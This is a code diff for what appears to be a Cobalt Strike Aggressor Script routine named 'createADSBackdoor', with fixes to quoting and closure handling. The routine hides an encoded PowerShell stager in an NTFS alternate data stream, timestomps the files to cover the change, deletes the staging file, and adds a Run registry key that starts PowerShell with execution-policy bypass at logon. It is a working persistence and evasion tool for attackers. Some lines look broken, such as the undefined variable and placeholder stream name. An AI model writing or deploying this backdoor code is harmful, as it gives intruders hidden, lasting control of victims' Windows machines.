@@ -10,7 +10,7 @@
 sub createADSBackdoor {
 	$bid = $1;
 	$selectedListener = $2;
-	prompt_text("Location of file/folder to give ADS?", "%APPDATA%\Temp", {
+	prompt_text("Location of file/folder to give ADS?", "%APPDATA%\Temp", lambda({
 		# Here's the bug, if you can think of a better way to do this,
 		#   please submit a PR
 		bcd($bid, $1);
@@ -18,15 +18,15 @@ sub createADSBackdoor {
 		$psPayload = powershell_encode_stager(shellcode($selectedListener));
 		# Create ADS file, ensure timestamps are not modified
 		bshell($bid, ">>adfjklbalgjbr.txt echo \"$psPayload\"");
-		btimestomp($bid, adfjklbalgjbr.txt, $1);
+		btimestomp($bid, "adfjklbalgjbr.txt", $1);
 		bshell($bid, "type adfjklbalgjbr.txt > $1 $+ :gfdjkasghslkg.txt");
-		btimestomp($bid, $1 $+ :gfdjkasghslkg.txt, adfjklbalgjbr.txt);
-		brm($bid, adfjklbalgjbr.txt);
+		btimestomp($bid, "$1 $+ :gfdjkasghslkg.txt", "adfjklbalgjbr.txt");
+		brm($bid, "adfjklbalgjbr.txt");
 		$psExecBackdoorCmd = powershell_encode_stager("gc $FILE_TO_ADS:<randomshit.txt> | powershell.exe -noprofile -ep bypass -enc -");
 		getADSRegName();
 		# Write the reg key for the backdoor
 		bpowershell($1, "Set-Item -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \" $+ $theADSRegName $+ \" -PropertyType String -Value \"powershell.exe -ExecutionPolicy bypass -noprofile -enc $psExecBackdoorCmd \"");
-	});
+	} $bid => $1, $selectedListener => $2 ));
 }
 
 # Returns a string to use for the reg key name
